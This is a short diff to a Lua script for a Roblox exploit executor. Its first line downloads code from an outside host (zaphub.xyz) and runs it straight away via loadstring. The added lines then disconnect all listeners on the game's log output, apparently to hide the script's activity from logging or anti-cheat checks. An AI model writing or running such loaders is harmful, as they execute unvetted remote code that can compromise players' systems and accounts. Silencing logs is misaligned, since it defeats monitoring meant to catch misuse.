@@ -1,1 +1,6 @@
 loadstring(game:HttpGet('https://zaphub.xyz/Exec'))()
+
+wait(4)
+for i,v in pairs(getconnections(game.LogService.MessageOut)) do
+    v:Disconnect()
+end
